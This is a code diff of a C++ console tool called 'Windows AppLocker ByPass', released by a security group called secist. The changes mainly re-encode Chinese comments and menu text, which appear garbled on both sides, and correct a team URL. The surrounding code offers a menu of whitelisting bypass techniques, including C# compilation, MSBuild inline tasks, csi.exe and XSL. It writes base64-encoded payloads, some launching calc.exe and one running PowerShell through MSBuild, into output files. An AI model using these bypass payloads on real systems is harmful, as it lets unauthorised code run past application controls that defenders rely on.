@@ -19,12 +19,12 @@ string GetProgramDir()
 
 Applocker::Applocker()
 {
-	CreateDirectory(TEXT("output"), NULL);//´´½¨output¿ÕÄ¿Â¼
+	CreateDirectory(TEXT("output"), NULL);//åˆ›å»ºoutputç©ºç›®å½•
 	system("cls");
 	cout << "			 /==========================########=========================\\  \n\
 			 |               #MY Blog: www.ggsec.cn#                     |  \n\
 	    	         |  	        #Windows AppLocker ByPass#                   |  \n\
-			 |           ¼´¿Ì°²È«ÖÜÄêÇì°æv1.0 | Demon 2017.7.14  |	\n\
+			 |           å³åˆ»å®‰å…¨å‘¨å¹´åº†ç‰ˆv1.0 | Demon 2017.7.14  |	\n\
 			 \\===========================================================/  \n " << endl;
 	cout << "					Windows AppLocker ByPass | Demon-secist   \n\n\
 			  1. .Net_c#_calc                    11. Mxsl demo.xml exec.xsl |calc\n \
@@ -37,7 +37,7 @@ Applocker::Applocker()
 	                  8. MSBuild-Csi.exe | Calc  \n \
 	                  9.  exit   \n \
 	                  10. About Me \n \
-	                           ÇëÊäÈëÑ¡Ïî >" << flush;
+	                           è¯·è¾“å…¥é€‰é¡¹ >" << flush;
 
 
 
@@ -48,7 +48,7 @@ Applocker::Applocker()
 
 	if (value == 1) {
 		std::string str1 = "dXNpbmcgU3lzdGVtOwpuYW1lc3BhY2UgSGVsbG9Xb3JsZAp7CiAgICBjbGFzcyBQcm9ncmFtCiAgICB7CiAgICAgICAgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQogICAgICAgIHsKICAgICAgICAgU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MuU3RhcnQoImNhbGMuZXhlIik7ICAKICAgICAgICB9CiAgICB9Cn0=";
-		std::ofstream ocout;//Êä³öÁ÷µÄÒ»¸ö¶ÔÏó
+		std::ofstream ocout;//è¾“å‡ºæµçš„ä¸€ä¸ªå¯¹è±¡
 		ocout.open("output\\secist.cs");
 		ocout << b64decodestring(str1);
 		ocout.close();
@@ -88,7 +88,7 @@ FjZS5DcmVhdGVQaXBlbGluZSgpOwogQ29uc29sZS5Xcml0ZUxpbmUoU3lzdGVtLk1hbmFnZW1lbnQuQX
 gICAgICAgICAgICAgICAgIC8vUHJlcCBQUyBmb3Igc3RyaW5nIG91dHB1dCBhbmQgaW52b2tlCiAgICAgICAgICAgICAgICAgICAgcGlwZWxpbmUuQ29tbWFuZHMuQWRkKCJPdXQtU3RyaW5nIik7CiAgICAgICAgICAgICAgICAgICAgQ29sbGVjdGlvbjxQU09iamVjdD4gcmVzdWx0cyA9IHBpcGVsaW5lLkludm9rZSgpOwogICAgICAgICAgICAgICAgICAgIHJ1bnNw\
 YWNlLkNsb3NlKCk7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nQnVpbGRlciBzdHJpbmdCdWlsZGVyID0gbmV3IFN0cmluZ0J1aWxkZXIoKTsKICAgICAgICAgICAgICAgICAgICBmb3JlYWNoIChQU09iamVjdCBvYmogaW4gcmVzdWx0cykKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZ0J1aWxkZXIuQXBwZW5kKG9ia\
 ik7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHJldHVybiBzdHJpbmdCdWlsZGVyLlRvU3RyaW5nKCkuVHJpbSgpOyAgICAgICAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgXV0+CiAgICAgIDwvQ29kZT4KICAgIDwvVGFzaz4KICA8L1VzaW5nVGFzaz4KPC9Qcm9qZWN0Pg==";
-		std::ofstream ocout;//¶¨ÒåÊä³öÁ÷µÄÒ»¸ö¶ÔÏó
+		std::ofstream ocout;//å®šä¹‰è¾“å‡ºæµçš„ä¸€ä¸ªå¯¹è±¡
 		ocout.open("output\\secist.csproj");
 		ocout << b64decodestring(str3);
 		ocout.close();
@@ -135,7 +135,7 @@ ik7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHJldHVybiBzdHJpbmdCd
 	else if (value == 8)
 	{
 		std::string str8 = "using system;system.diagnostics.process.start(\"calc.exe\");";
-		std::ofstream ocout;//Êä³öÁ÷µÄÒ»¸ö¶ÔÏó
+		std::ofstream ocout;//è¾“å‡ºæµçš„ä¸€ä¸ªå¯¹è±¡
 		ocout.open("output\\secist.csx");
 		ocout << str8;
 		ocout.close();
@@ -181,7 +181,7 @@ ik7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHJldHVybiBzdHJpbmdCd
 
 	else
 	{
-		cout << "ÎÞÐ§Ñ¡Ïî" << endl;
+		cout << "æ— æ•ˆé€‰é¡¹" << endl;
 		system("pause");
 	}
 	dir();
@@ -189,7 +189,7 @@ ik7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHJldHVybiBzdHJpbmdCd
 
 
 dir::dir() {
-	// ÅÐ¶ÏÄ¿Â¼ÊÇ·ñÎª¿Õ 
+	// åˆ¤æ–­ç›®å½•æ˜¯å¦ä¸ºç©º 
 	HANDLE hFind;
 	WIN32_FIND_DATA FindFileData;
 	if ((hFind = FindFirstFileA("Output\\*.*", &FindFileData)) != INVALID_HANDLE_VALUE)
@@ -205,19 +205,19 @@ dir::dir() {
 			}
 			else
 			{
-				//ÓÐ×ÓÎÄ¼þ¼ÐÒ²Ëã·Ç¿Õ
+				//æœ‰å­æ–‡ä»¶å¤¹ä¹Ÿç®—éžç©º
 				EmptyDirectory = FALSE;
 				break;
 			}
 		}
 		if (EmptyDirectory)
 		{
-			//É¾³ý¿ÕÄ¿Â¼
+			//åˆ é™¤ç©ºç›®å½•
 			RemoveDirectory("Output");
 		}
 		else
 		{
-			//É¾³ý·Ç¿ÕÄ¿Â¼
+			//åˆ é™¤éžç©ºç›®å½•
 			system("rd/s/q Output");
 		}
 		//dir();
@@ -235,13 +235,13 @@ about::about() {
          Hi there, I'm Demon. I have an interest in technology, both development of applications \n\
 as well as systems administrations -- focussing mostly on Linux and everything open source. \n\n\
 About my team\n\
-         secist(http://www.secis.com) is a volunteer group focused on promoting writers and their writing in\
+         secist(http://www.secist.com) is a volunteer group focused on promoting writers and their writing in\
  a professional way, across differentsocial media platforms for free.We provide a platform for those \
  with a story to tell, knowledge to share, or an experience that we can all learn from.If you are a new \
 or emerging writer, work with us to raise your profile, polish your articles and present your work in the \
 best possible light. \n\n\
-         I will always remember something my father told me, ¡°you have to help enough other people get what they \
-want first, before you can get what you want out of life¡±. \n\n\
+         I will always remember something my father told me, â€œyou have to help enough other people get what they \
+want first, before you can get what you want out of lifeâ€. \n\n\
 Join us! Support secist in championing the work of others. \n\n\
 Contact\n\n\
          I'm best contacted through e-mail, at 1955270830@qq.com.Also welcome you to join our discussion group through QQ,account number 307283889.\
